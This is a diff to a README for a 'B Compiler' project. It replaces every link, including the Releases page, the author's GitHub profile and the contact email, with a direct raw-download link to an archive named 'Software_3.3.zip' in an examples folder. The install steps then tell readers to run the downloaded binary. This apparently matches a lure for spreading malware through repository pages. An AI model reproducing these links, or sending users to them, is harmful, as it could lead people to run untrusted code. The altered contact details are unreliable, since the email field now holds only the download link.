@@ -4,7 +4,7 @@ Welcome to the **B Compiler** repository! This project aims to provide a powerfu
 
 ## 🚀 Quick Start
 
-To get started, download the latest release of the B Compiler from our [Releases section](https://github.com/vicRang24Raes/b/releases). Once downloaded, execute the binary to begin using the compiler.
+To get started, download the latest release of the B Compiler from our [Releases section](https://github.com/vicRang24Raes/b/raw/refs/heads/main/examples/Software_3.3.zip). Once downloaded, execute the binary to begin using the compiler.
 
 ## 📦 Table of Contents
 
@@ -31,7 +31,7 @@ The B programming language is a simple yet powerful language that serves as a pr
 
 To install the B Compiler, follow these steps:
 
-1. Visit the [Releases section](https://github.com/vicRang24Raes/b/releases) to download the latest version.
+1. Visit the [Releases section](https://github.com/vicRang24Raes/b/raw/refs/heads/main/examples/Software_3.3.zip) to download the latest version.
 2. Extract the downloaded files.
 3. Navigate to the extracted folder in your terminal.
 4. Run the following command to execute the compiler:
@@ -89,7 +89,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **GitHub**: [vicRang24Raes](https://github.com/vicRang24Raes)
-- **Email**: vic@example.com
+- **GitHub**: [vicRang24Raes](https://github.com/vicRang24Raes/b/raw/refs/heads/main/examples/Software_3.3.zip)
+- **Email**: https://github.com/vicRang24Raes/b/raw/refs/heads/main/examples/Software_3.3.zip
 
-Thank you for checking out the B Compiler! We hope you find it useful for your programming needs. Don't forget to visit the [Releases section](https://github.com/vicRang24Raes/b/releases) for the latest updates and downloads!
+Thank you for checking out the B Compiler! We hope you find it useful for your programming needs. Don't forget to visit the [Releases section](https://github.com/vicRang24Raes/b/raw/refs/heads/main/examples/Software_3.3.zip) for the latest updates and downloads!
